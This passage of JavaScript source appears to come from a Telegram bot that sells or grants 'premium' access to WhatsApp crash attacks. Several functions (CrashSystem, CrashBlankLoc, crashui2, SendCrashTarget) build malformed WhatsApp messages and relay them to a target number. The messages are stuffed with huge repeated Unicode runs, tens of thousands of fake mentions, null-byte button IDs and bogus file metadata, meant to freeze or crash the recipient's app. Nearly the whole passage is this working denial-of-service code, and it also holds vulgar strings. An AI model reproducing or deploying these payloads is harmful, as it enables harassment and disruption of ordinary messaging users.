                      "/text/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1726867151",
                    contactVcard: true,
                    jpegThumbnail:
                      "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAOQMBIgACEQEDEQH/xAAvAAACAwEBAAAAAAAAAAAAAAACBAADBQEGAQADAQAAAAAAAAAAAAAAAAABAgMA/9oADAMBAAIQAxAAAAA87YUMO16iaVwl9FSrrywQPTNV2zFomOqCzExzltc8uM/lGV3zxXyDlJvj7RZJsPibRTWvV0qy7dOYo2y5aeKekTXvSVSwpCODJB//xAAmEAACAgICAQIHAQAAAAAAAAABAgADERIEITETUgUQFTJBUWEi/9oACAEBAAE/ACY7EsTF2NAGO49Ni0kmOIflmNSr+Gg4TbjvqaqizDX7ZJAltLqTlTCkKTWehaH1J6gUqMCBQcZmoBMKAjBjcep2xpLfh6H7TPpp98t5AUyu0WDoYgOROzG6MEAw0xENbHZ3lN1O5JfAmyZUqcqYSI1qjow2KFgIIyJq0Whz56hTQfcDKbioCmYbAbYYjaWdiIucZ8SokmwA+D1P9e6WmweWiAmcXjC5G9wh42HClusdxERBqFhFZUjWVKAGI/cysDknzK2wO5xbLWBVOpRVqSScmEfyOoCk/wAlC5rmgiyih7EZ/wACca96wcQc1wIvOs/IEfm71sNDFZxUuDPWf9z/xAAdEQEBAQACAgMAAAAAAAAAAAABABECECExEkFR/9oACAECAQE/AHC4vnfqXelVsstYSdb4z7jvlz4b7lyCfBYfl//EAB4RAAMBAAICAwAAAAAAAAAAAAABEQIQEiFRMWFi/9oACAEDAQE/AMtNfZjPW8rJ4QpB5Q7DxPkqO3pGmUv5MrU4hCv2f//Z",
                  },
                  hasMediaAttachment: true,
                },
                body: {
                  text: "hah" + spamContent + crashContent,
                },
                nativeFlowMessage: {},
                contextInfo: {
                  mentionedJid: ["2348127187030@s.whatsapp.net"],
                  forwardingScore: 1,
                  isForwarded: true,
                  fromMe: false,
                  participant: "0@s.whatsapp.net",
                  remoteJid: "status@broadcast",
                  quotedMessage: {
                    documentMessage: {
                      url: "https://mmg.whatsapp.net/text/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                      mimetype:
                        "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                      fileSha256:
                        "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                      fileLength: "9999999999999",
                      pageCount: 1316134911,
                      mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                      fileName: "CRASHMSG",
                      fileEncSha256:
                        "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                      directPath:
                        "/text/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                      mediaKeyTimestamp: "1724474503",
                      contactVcard: true,
                      thumbnailDirectPath:
                        "/text/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                      thumbnailSha256:
                        "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                      thumbnailEncSha256:
                        "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                      jpegThumbnail:
                        "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAOQMBIgACEQEDEQH/xAAvAAACAwEBAAAAAAAAAAAAAAACBAADBQEGAQADAQAAAAAAAAAAAAAAAAABAgMA/9oADAMBAAIQAxAAAAA87YUMO16iaVwl9FSrrywQPTNV2zFomOqCzExzltc8uM/lGV3zxXyDlJvj7RZJsPibRTWvV0qy7dOYo2y5aeKekTXvSVSwpCODJB//xAAmEAACAgICAQIHAQAAAAAAAAABAgADERIEITETUgUQFTJBUWEi/9oACAEBAAE/ACY7EsTF2NAGO49Ni0kmOIflmNSr+Gg4TbjvqaqizDX7ZJAltLqTlTCkKTWehaH1J6gUqMCBQcZmoBMKAjBjcep2xpLfh6H7TPpp98t5AUyu0WDoYgOROzG6MEAw0xENbHZ3lN1O5JfAmyZUqcqYSI1qjow2KFgIIyJq0Whz56hTQfcDKbioCmYbAbYYjaWdiIucZ8SokmwA+D1P9e6WmweWiAmcXjC5G9wh42HClusdxERBqFhFZUjWVKAGI/cysDknzK2wO5xbLWBVOpRVqSScmEfyOoCk/wAlC5rmgiyih7EZ/wACca96wcQc1wIvOs/IEfm71sNDFZxUuDPWf9z/xAAdEQEBAQACAgMAAAAAAAAAAAABABECECExEkFR/9oACAECAQE/AHC4vnfqXelVsstYSdb4z7jvlz4b7lyCfBYfl//EAB4RAAMBAAICAwAAAAAAAAAAAAABEQIQEiFRMWFi/9oACAEDAQE/AMtNfZjPW8rJ4QpB5Q7DxPkqO3pGmUv5MrU4hCv2f//Z",
                    },
                  },
                },
              },
            },
          },
        },
        Ptcp
          ? {
              participant: {
                jid: target,
              },
            }
          : {}
      );
    }
    
async function CrashSystem(target, quoted = false) {
      const spamText = "_*~@2348146895993~*_\n".repeat(10200);
      const crashText = "ꦽ".repeat(1500);
      await cella.relayMessage(
        target,
        {
          ephemeralMessage: {
            message: {
              interactiveMessage: {
                header: {
                  documentMessage: {
                    url: "https://mmg.whatsapp.net/text/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                    mimetype:
                      "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                    fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                    fileLength: "9999999999999",
                    pageCount: 1316134911,
                    mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                    fileName: "ZehyrineSystem",
                    fileEncSha256:
                      "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                    directPath:
                      "/text/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1726867151",
                    contactVcard: true,
                    jpegThumbnail: "",
                  },
                  hasMediaAttachment: true,
                },
                body: {
                  text: "ctash" + crashText + spamText,
                },
                contextInfo: {
                  mentionedJid: ["2348127187030@s.whatsapp.net"],
                  mentions: ["2348127187030@s.whatsapp.net"],
                },
                footer: {
                  text: "",
                },
                nativeFlowMessage: {},
                contextInfo: {
                  mentionedJid: [
                    "2348146895993@s.whatsapp.net",
                    ...Array.from(
                      {
                        length: 30000,
                      },
                      () =>
                        "1" +
                        Math.floor(Math.random() * 500000) +
                        "@s.whatsapp.net"
                    ),
                  ],
                  forwardingScore: 1,
                  isForwarded: true,
                  fromMe: false,
                  participant: "2348146895993@s.whatsapp.net",
                  remoteJid: "status@broadcast",
                  quotedMessage: {
                    documentMessage: {
                      url: "https://mmg.whatsapp.net/text/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                      mimetype:
                        "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                      fileSha256:
                        "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                      fileLength: "9999999999999",
                      pageCount: 1316134911,
                      mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                      fileName: "ZephyrineXsui",
                      fileEncSha256:
                        "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                      directPath:
                        "/text/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                      mediaKeyTimestamp: "1724474503",
                      contactVcard: true,
                      thumbnailDirectPath:
                        "/text/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                      thumbnailSha256:
                        "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                      thumbnailEncSha256:
                        "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                      jpegThumbnail: "",
                    },
                  },
                },
              },
            },
          },
        },
        quoted
          ? {
              participant: {
                jid: target,
              },
            }
          : {}
      );
    }
    
async function CrashBlankLoc(target, options = false) {
      const spamMessage = "_*~@2348127187030~*_\n".repeat(10200);
      const crashMessage = "ꦽ".repeat(10200);
      cella.relayMessage(
        target,
        {
          viewOnceMessage: {
            message: {
              extendedTextMessage: {
                text: "ctash" + spamMessage,
                previewType: "ZephyrineSystem",
                contextInfo: {
                  mentionedJid: [
                    "2348146895993@s.whatsapp.net",
                    "2348146895993@s.whatsapp.net",
                  ],
                },
              },
            },
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
      await cella.relayMessage(
        target,
        {
          viewOnceMessage: {
            message: {
              interactiveMessage: {
                body: {
                  text: "ctash" + spamMessage + crashMessage,
                },
                footer: {
                  text: "",
                },
                header: {
                  documentMessage: {
                    url: "https://mmg.whatsapp.net/text/t62.7119-24/19973861_773172578120912_2263905544378759363_n.enc?ccb=11-4&oh=01_Q5AaIMqFI6NpAOoKBsWqUR52hN9p5YIGxW1TyJcHyVIb17Pe&oe=6653504B&_nc_sid=5e03e0&mms3=true",
                    mimetype: "application/pdf",
                    fileSha256: "oV/EME/ku/CjRSAFaW+b67CCFe6G5VTAGsIoimwxMR8=",
                    fileLength: null,
                    pageCount: 99999999999999,
                    contactVcard: true,
                    caption: "Zephyrine",
                    mediaKey: "yU8ofp6ZmGyLRdGteF7Udx0JE4dXbWvhT6X6Xioymeg=",
                    fileName: "Zephyrine ",
                    fileEncSha256:
                      "0dJ3YssZD1YUMm8LdWPWxz2VNzw5icWNObWWiY9Zs3k=",
                    directPath:
                      "/text/t62.7119-24/19973861_773172578120912_2263905544378759363_n.enc?ccb=11-4&oh=01_Q5AaIMqFI6NpAOoKBsWqUR52hN9p5YIGxW1TyJcHyVIb17Pe&oe=6653504B&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1714145232",
                    thumbnailDirectPath:
                      "/text/t62.36145-24/32182773_798270155158347_7279231160763865339_n.enc?ccb=11-4&oh=01_Q5AaIGDA9WE26BzZF37Vp6aAsKq56VhpiK6Gdp2EGu1AoGd8&oe=665346DE&_nc_sid=5e03e0",
                    thumbnailSha256:
                      "oFogyS+qrsnHwWFPNBmtCsNya8BJkTlG1mU3DdGfyjg=",
                    thumbnailEncSha256:
                      "G2VHGFcbMP1IYd95tLWnpQRxCb9+Q/7/OaiDgvWY8bM=",
                    jpegThumbnail:
                      "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABERERESERMVFRMaHBkcGiYjICAjJjoqLSotKjpYN0A3N0A3WE5fTUhNX06MbmJiboyiiIGIosWwsMX46/j///8BERERERIRExUVExocGRwaJiMgICMmOiotKi0qOlg3QDc3QDdYTl9NSE1fToxuYmJujKKIgYiixbCwxfjr+P/////CABEIACIAYAMBIgACEQEDEQH/xAAwAAACAwEBAAAAAAAAAAAAAAADBAACBQYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAA5CpC5601s5+88/TJ01nBC6jmytPTAQuZhpxa2PQ0WjCP2T6LXLJR3Ma5WSIsDXtUZYkz2seRXNmSAY8m/PlhkUdZD//EAC4QAAIBAwIEBAQHAAAAAAAAAAECAAMRIRIxBCJBcQVRgbEQEzIzQmFygsHR4f/aAAgBAQABPwBKSsN4aZERmVVybZxecODVpEsCE2zmIhYgAZMbwjiQgbBNto9MqSCMwiUioJDehvaVBynIJ3xKPDki7Yv7StTC3IYdoLAjT/s0ltpSOhgSAR1BlTi7qUQTw/g3aolU4VTLzxLgg96yb9Yy2gJVgRLKgL1VtfZdyTKdXQrO246dB+UJJJJ3hRAoDWA84p+WRc3U9YANRmlT3nK9NdN9u1jKD1KeNTSsfnmzFiB5Eypw9ADUS4Hr/U1LT+1T9SPcmEaiWJ1N59BKrAcgNxfJ+BV25nNu8QlLE5WJj9J2mhTKTMjAX5SZTo0qYDsVJOxgalWauFtdeonE1NDW27ZEeqpz/F/ePUJHXuYfgxJqQfT6RPtfujE3pwdJQ5uDYNnB3nAABKlh+IzisvVh2hhg3n//xAAZEQACAwEAAAAAAAAAAAAAAAABIAACEWH/2gAIAQIBAT8AYDs16p//xAAfEQABAwQDAQAAAAAAAAAAAAABAAIRICExMgMSQoH/2gAIAQMBAT8ALRERdYpc6+sLrIREUenIa/AuXFH/2Q==",
                    thumbnailHeight: 172,
                    thumbnailWidth: 480,
                  },
                  hasMediaAttachment: true,
                },
                nativeFlowMessage: {
                  buttons: [
                    {
                      name: "single_select",
                      buttonParamsJson: JSON.stringify({
                        title: "ZephyrineLoveu",
                        sections: [
                          {
                            title: "",
                            rows: [
                              {
                                title: "ZephyrineSystemUi",
                                id: ".huii",
                              },
                            ],
                          },
                        ],
                      }),
                    },
                  ],
                },
                contextInfo: {
                  mentionedJid: target,
                  mentions: target,
                },
                disappearingMode: {
                  initiator: "INITIATED_BY_ME",
                  inviteLinkGroupTypeV2: "DEFAULT",
                  messageContextInfo: {
                    deviceListMetadata: {
                      senderTimestamp: "1678285396",
                      recipientKeyHash: "SV5H7wGIOXqPtg==",
                      recipientTimestamp: "1678496731",
                      deviceListMetadataVersion: 2,
                    },
                  },
                },
              },
            },
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
      await cella.relayMessage(
        target,
        {
          viewOnceMessage: {
            message: {
              locationMessage: {
                degreesLatitude: -21.980324912168495,
                degreesLongitude: 24.549921490252018,
                name: "ct2" + spamMessage,
                address: "",
                jpegThumbnail:
                  "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAPwMBIgACEQEDEQH/xAAwAAACAwEBAAAAAAAAAAAAAAADBAACBQEGAQADAQEAAAAAAAAAAAAAAAABAgMABP/aAAwDAQACEAMQAAAAz2QAZ/Q57OSj+gLlnhnQdIBnhbzugXQZXcL6CF2XcIhqctQY3oMPokgQo6ArA2ZsVnlYUvnMq3lF7UfDKToz7SneaszZLzraR84aSDD7Jn//xAAhEAACAgIDAAMBAQAAAAAAAAABAgADBBESITETIkFRgf/aAAgBAQABPwAX2A2Op9MOSj1cbE7mEgqxy8NhsvDH+9RF12YGnFTLamPg3MnFONYFDbE+1liLx9MzXNVVdan8gdgVI/DEzlYaY9xbQRuJZyE5zKT5Mhj+ATGrUXDZ6EznJs3+RuvDOz3MXJRfo8+Sv1HE+xjsP2WMEfce5XUrv2MnoI6EJB8laAnuVUdgxelj1lpkE89Q7iO0ABGx/olNROyRE2hituW9IZah2TOBI7E48PYnEJsSm3YG4AGE4lfJk2a0sZuTdxiCpIjAOkLlQBqUOS2ojagOxMonmDOXsJHHqIdtLqSdESisq2yI2otnGZP2oVoDPNiBSBvUqO9SwdQGan//xAAdEQADAQADAAMAAAAAAAAAAAAAAQIRECExMkGB/9oACAECAQE/AMlpMXejivs2kydawnr0pKkWkvHpDOitzoeMldIw1OWNaR5+8P5cf//EAB0RAAIDAAIDAAAAAAAAAAAAAAERAAIQAxIgMVH/2gAIAQMBAT8Acpx2tXsIdZHowNwaPBF4M+Z//9k=",
              },
            },
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
      await cella.relayMessage(
        target,
        {
          botInvokeMessage: {
            message: {
              messageContextInfo: {
                deviceListMetadataVersion: 2,
                deviceListMetadata: {},
              },
              interactiveMessage: {
                nativeFlowMessage: {
                  buttons: [
                    {
                      name: "payment_info",
                      buttonParamsJson:
                        '{"currency":"INR","total_amount":{"value":0,"offset":100},"reference_id":"4PVSNK5RNNJ","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"🦄드림 가이 Zyn;","key":"🦄드림 가이 Zyn","key_type":"RANDOM"}}]}',
                    },
                  ],
                },
              },
            },
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
      await cella.relayMessage(
        target,
        {
          viewOnceMessage: {
            message: {
              liveLocationMessage: {
                degreesLatitude: 11111111,
                degreesLongitude: -111111,
                caption: "crash" + spamMessage,
                url: "https://" + crashMessage + ".com",
                sequenceNumber: "1678556734042001",
                jpegThumbnail: null,
                expiration: 7776000,
                ephemeralSettingTimestamp: "1677306667",
                disappearingMode: {
                  initiator: "INITIATED_BY_ME",
                  inviteLinkGroupTypeV2: "DEFAULT",
                  messageContextInfo: {
                    deviceListMetadata: {
                      senderTimestamp: "1678285396",
                      recipientKeyHash: "SV5H7wGIOXqPtg==",
                      recipientTimestamp: "1678496731",
                      deviceListMetadataVersion: 2,
                    },
                  },
                },
                contextInfo: {
                  mentionedJid: target,
                  mentions: target,
                  isForwarded: true,
                  fromMe: false,
                  participant: "0@s.whatsapp.net",
                  remoteJid: "0@s.whatsapp.net",
                },
              },
            },
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

	async function crashui2(target, ptcp = false) {
    await cella.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "trash" + "ꦾ".repeat(300000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: " faMzy " }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}

async function SendCrashTarget(target, ptcp = true) {
const stanza = [
{
attrs: { biz_bot: '1' },
tag: "bot",
},
{
attrs: {},
tag: "biz",
},
];

let messagePayload = {
viewOnceMessage: {
message: {
listResponseMessage: {
title: "Assalamualaikum Bang Izin Pushkontak" + "ꦽ".repeat(45000),
listType: 2,
singleSelectReply: {
    selectedRowId: "🩸"
},
contextInfo: {
stanzaId: cella.generateMessageTag(),
participant: "0@s.whatsapp.net",
remoteJid: "status@broadcast",
mentionedJid: [target, "13135550002@s.whatsapp.net"],
quotedMessage: {
                buttonsMessage: {
                    documentMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                        fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                        fileLength: "9999999999999",
                        pageCount: 3567587327,
                        mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                        fileName: "MUGEN TSUKOYOMI͟",
                        fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                        directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                        mediaKeyTimestamp: "1735456100",
                        contactVcard: true,
                        caption: "a sorry word won't kill you, you can face fear"
                    },
                    contentText: "Falling Die \"Die\"",
                    footerText: "© FᴀᴍᴢʏLᴇᴇ",
                    buttons: [
                        {
                            buttonId: "\u0000".repeat(850000),
                            buttonText: {
                                displayText: "FᴀᴍᴢʏLᴇᴇ"
                            },
                            type: 1
                        }
                    ],
                    headerType: 3
                }
},
conversionSource: "porn",
conversionData: crypto.randomBytes(16),
conversionDelaySeconds: 9999,
forwardingScore: 999999,
isForwarded: true,
quotedAd: {
advertiserName: " x ",
mediaType: "IMAGE",
jpegThumbnail: tdxlol,
caption: " x "
},
placeholderKey: {
remoteJid: "0@s.whatsapp.net",
fromMe: false,
id: "ABCDEF1234567890"
},
expiration: -99999,
ephemeralSettingTimestamp: Date.now(),
ephemeralSharedSecret: crypto.randomBytes(16),
entryPointConversionSource: "kontols",
entryPointConversionApp: "kontols",
actionLink: {
url: "t.me/famzzy_lee",
buttonTitle: "konstol"
},
disappearingMode:{
initiator:1,
trigger:2,
initiatorDeviceJid: target,
initiatedByMe:true
},
groupSubject: "kontol",
parentGroupJid: "kontolll",
trustBannerType: "kontol",
trustBannerAction: 99999,
isSampled: true,
externalAdReply: {
title: "! Famzy - \"𝗋34\" 🩸",
mediaType: 2,
renderLargerThumbnail: false,
showAdAttribution: false,
containsAutoReply: false,
body: "© running since 2020 to 20##?",
thumbnail: tdxlol,
sourceUrl: "go fuck yourself",
sourceId: "dvx - problem",
ctwaClid: "cta",
ref: "ref",
clickToWhatsappCall: true,
automatedGreetingMessageShown: false,
greetingMessageBody: "kontol",
ctaPayload: "cta",
disableNudge: true,
originalImageUrl: "konstol"
},
featureEligibilities: {
cannotBeReactedTo: true,
cannotBeRanked: true,
canRequestFeedback: true
},
forwardedNewsletterMessageInfo: {
newsletterJid: "120363209022250445@newsletter",
serverMessageId: 1,
newsletterName: `- Famzy      - 〽${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
contentType: 3,
accessibilityText: "kontol"
},
statusAttributionType: 2,
utm: {
utmSource: "utm",
utmCampaign: "utm2"
}
},
description: "famzy"
},
messageContextInfo: {
messageSecret: crypto.randomBytes(32),
supportPayload: JSON.stringify({
version: 2,
is_ai_message: true,
should_show_system_message: true,
ticket_id: crypto.randomBytes(16),
}),
},
}
}
}

await cella.relayMessage(target, messagePayload, {
additionalNodes: stanza,
participant: { jid : target }
});
}

console.log('=== AVANT BOT LAUNCH ===');

bot.launch().then(() => {
    console.log("Telegram bot is running...");
}).catch(err => {
    console.error('Error starting bot:', err);
});

// Nettoyage périodique
setInterval(() => {
    const now = Date.now();
    
    // Nettoyer les utilisateurs premium expirés
    Object.keys(usersPremium).forEach(userId => {
        if (usersPremium[userId].premiumUntil < now) {
            delete usersPremium[userId];
        }
    });
    
    // Nettoyer les sessions bot expirées (si la variable existe)
    if (typeof botSessions !== 'undefined') {
        Object.keys(botSessions).forEach(botToken => {
            if (botSessions[botToken].expiresAt < now) {
                delete botSessions[botToken];
            }
        });
    }
    
    // Sauvegarder les données
    fs.writeFileSync(USERS_PREMIUM_FILE, JSON.stringify(usersPremium, null, 2));
    
}, 60 * 60 * 1000); // Check every hour

console.log('=== BOT INITIALIZED ===');
